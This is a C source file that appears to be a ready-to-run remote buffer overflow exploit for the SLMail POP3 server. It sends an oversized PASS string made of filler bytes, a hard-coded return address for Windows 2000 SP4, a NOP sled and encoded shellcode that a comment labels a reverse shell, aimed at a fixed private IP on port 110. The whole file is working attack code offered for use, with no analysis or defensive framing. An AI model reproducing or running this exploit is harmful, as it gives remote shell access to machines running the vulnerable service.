#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h> // for close
#include <arpa/inet.h> // for inet_addr

#define retadd "\x8f\x35\x4a\x5f" /*win2k server sp4 0x5f4a358f*/
#define port 110



/* revshell العراق القراصنة المجموعة*/
char shellcode[] =
"\xda\xcb\xba\x43\xbf\x43\x02\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x17\x03\x56\x17\x83\xad\x43\xa1\xf7\xcd\x54\xa4"
"\xf8\x2d\xa5\xc9\x71\xc8\x94\xc9\xe6\x99\x87\xf9\x6d\xcf\x2b"
"\x71\x23\xfb\xb8\xf7\xec\x0c\x08\xbd\xca\x23\x89\xee\x2f\x22"
"\x09\xed\x63\x84\x30\x3e\x76\xc5\x75\x23\x7b\x97\x2e\x2f\x2e"
"\x07\x5a\x65\xf3\xac\x10\x6b\x73\x51\xe0\x8a\x52\xc4\x7a\xd5"
"\x74\xe7\xaf\x6d\x3d\xff\xac\x48\xf7\x74\x06\x26\x06\x5c\x56"
"\xc7\xa5\xa1\x56\x3a\xb7\xe6\x51\xa5\xc2\x1e\xa2\x58\xd5\xe5"
"\xd8\x86\x50\xfd\x7b\x4c\xc2\xd9\x7a\x81\x95\xaa\x71\x6e\xd1"
"\xf4\x95\x71\x36\x8f\xa2\xfa\xb9\x5f\x23\xb8\x9d\x7b\x6f\x1a"
"\xbf\xda\xd5\xcd\xc0\x3c\xb6\xb2\x64\x37\x5b\xa6\x14\x1a\x34"
"\x0b\x15\xa4\xc4\x03\x2e\xd7\xf6\x8c\x84\x7f\xbb\x45\x03\x78"
"\xbc\x7f\xf3\x16\x43\x80\x04\x3f\x80\xd4\x54\x57\x21\x55\x3f"
"\xa7\xce\x80\x90\xf7\x60\x7b\x51\xa7\xc0\x2b\x39\xad\xce\x14"
"\x59\xce\x04\x3d\xf0\x35\xcf\x48\x0e\x35\xa3\x25\x12\x35\xba"
"\x0e\x9b\xd3\xd6\x60\xca\x4c\x4f\x18\x57\x06\xee\xe5\x4d\x63"
"\x30\x6d\x62\x94\xff\x86\x0f\x86\x68\x67\x5a\xf4\x3f\x78\x70"
"\x90\xdc\xeb\x1f\x60\xaa\x17\x88\x37\xfb\xe6\xc1\xdd\x11\x50"
"\x78\xc3\xeb\x04\x43\x47\x30\xf5\x4a\x46\xb5\x41\x69\x58\x03"
"\x49\x35\x0c\xdb\x1c\xe3\xfa\x9d\xf6\x45\x54\x74\xa4\x0f\x30"
"\x01\x86\x8f\x46\x0e\xc3\x79\xa6\xbf\xba\x3f\xd9\x70\x2b\xc8"
"\xa2\x6c\xcb\x37\x79\x35\xeb\xd5\xab\x40\x84\x43\x3e\xe9\xc9"
"\x73\x95\x2e\xf4\xf7\x1f\xcf\x03\xe7\x6a\xca\x48\xaf\x87\xa6"
"\xc1\x5a\xa7\x15\xe1\x4e";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(3500);
    memset(buffer, 0x00, 3500);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(16);
    memset(nop, 0x00, 16);
    memset(nop, 0x90, 16);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.4.23");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
